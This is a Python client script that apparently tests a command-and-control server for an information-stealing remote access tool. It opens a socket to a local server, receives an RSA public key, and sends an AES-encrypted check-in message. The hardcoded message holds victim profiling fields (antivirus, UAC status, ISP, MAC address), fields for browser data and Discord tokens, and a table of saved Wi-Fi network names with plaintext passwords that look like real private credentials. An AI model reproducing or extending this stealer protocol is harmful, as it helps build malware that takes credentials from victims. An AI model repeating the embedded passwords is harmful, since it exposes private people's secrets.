import socket
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

# Function to encrypt data using AES
def aes_encrypt(data, key):
    iv = os.urandom(16)  # Generate a random IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return iv + ciphertext  # Include IV with the ciphertext

# Connect to the Go server
HOST, PORT = "127.0.0.1", 65432

print("Connecting to server...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    # Receive public key from server
    public_pem = s.recv(4096)
    print("Public key received from server")

    # Load the public key
    print(f"Public key: {public_pem}")
    public_key = load_pem_public_key(public_pem)

    # Encrypt the message
    message = b'{"type": "connection", "data": null, "arguments": null, "json_data": {"computer_name": "Lukas", "computer_os": "Windows", "computer_version": "10.0.26100", "total_memory": 34270035968, "up_time": "12:46:38", "uuid": "00000000-0000-0000-0000-6c94669a4241", "cpu": "AMD64 Family 25 Model 33 Stepping 2, AuthenticAMD", "gpu": "NVIDIA GeForce RTX 3080 Ti", "uac": false, "anti_virus": "[{\\"Name\\": \\"Windows Defender\\", \\"Version\\": \\"Unknown\\", \\"Publisher\\": \\"Unknown\\", \\"Source\\": \\"SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows Defender\\"}]", "ip": "127.0.0.1", "client_ip": "127.0.0.1", "country": "Norway", "mac_address": "41:90:24:09:42:90", "gateway": "169.254.83.37", "dns": "169.254.83.37", "subnet_mask": null, "isp": "Telenor", "timezone": "Vest-Europa (normaltid)", "disks": "[\\"Device: C:\\\\\\\\ - Mountpoint: C:\\\\\\\\ - FsType: NTFS - Total: 1998867918848 - Used: 498300932096 - Free: 1500566986752 - Percent: 24.9\\"]", "wifi": "SSID                | PASSWORD\\n--------------------|-----------------------------\\nStupetarnet2024     | Stupetarnet2025\\nNextGenTel_F0B2     | BCYENUGTUMBBQR\\nNextGenTel_F0B2_2.4GHz| BCYENUGTUMBBQR\\nLukas sin iPhone    | LukenErEn\\nOlsen               | Arne1977\\n", "webbrowsers": ["chrome", "edge", "chromium"], "discord_tokens": [[], []]}}'

    # Step 1: Generate a random AES key
    aes_key = os.urandom(32)  # 256-bit AES key

    # Step 2: Encrypt the message with AES
    encrypted_message = aes_encrypt(message, aes_key)

    # Step 3: Encrypt the AES key with the server's RSA public key
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    # Send both the encrypted AES key and the encrypted message to the server
    s.sendall(encrypted_aes_key + b"||" + encrypted_message)
    print("Encrypted data sent to server")
